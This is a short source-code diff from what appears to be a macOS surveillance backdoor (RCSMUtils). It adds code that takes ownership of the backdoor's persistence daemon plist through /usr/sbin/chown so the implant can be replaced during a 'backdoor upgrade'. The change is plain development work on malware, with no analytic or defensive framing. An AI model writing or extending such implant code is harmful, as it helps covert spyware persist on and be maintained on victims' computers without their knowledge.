@@ -253,7 +253,24 @@ static RCSMUtils *sharedUtils = nil;
       NSLog(@"Plist file saved: correctly");
 #endif
     }
-    
+  
+  //
+  // Force owner since we can't remove that file if not owned by us
+  // with removeItemAtPath:error (e.g. backdoor upgrade)
+  //
+  NSString *ourPlist = [NSString stringWithFormat: @"%@/%@",
+                        NSHomeDirectory(),
+                        BACKDOOR_DAEMON_PLIST];
+  NSString *userAndGroup = [NSString stringWithFormat: @"%@:staff", NSUserName()];
+  NSArray *_tempArguments = [[NSArray alloc] initWithObjects:
+                             userAndGroup,
+                             ourPlist,
+                             nil];
+  
+  [gUtil executeTask: @"/usr/sbin/chown"
+       withArguments: _tempArguments
+        waitUntilEnd: YES];
+  
   return YES;
 }
 
